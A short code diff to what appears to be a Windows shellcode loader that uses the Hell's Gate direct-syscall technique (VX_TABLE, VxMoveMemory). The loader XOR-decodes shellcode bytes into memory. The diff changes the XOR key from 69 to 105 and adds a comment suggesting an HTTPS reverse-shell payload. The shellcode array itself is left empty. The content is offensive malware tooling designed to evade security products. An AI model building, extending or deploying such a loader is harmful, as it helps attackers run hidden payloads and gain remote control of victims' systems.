@@ -167,6 +167,7 @@ BOOL Payload(PVX_TABLE pVxTable) {
 	NTSTATUS status = 0x00000000;
 
 	//place your shellcode here:
+	//use https rev, c
 
 	char shellcode[] = "";
 
@@ -180,7 +181,7 @@ BOOL Payload(PVX_TABLE pVxTable) {
 	PVOID Base_address;
 	for (int i = 0; i <= sizeof(shellcode); i++) {
 		//put your key here in case u changed : 
-		char DecodedOpCode = shellcode[i] ^ 69;
+		char DecodedOpCode = shellcode[i] ^ 105;
 		VxMoveMemory((ULONG_PTR)lpAddress + i, &DecodedOpCode, 0x1);
 
 	}
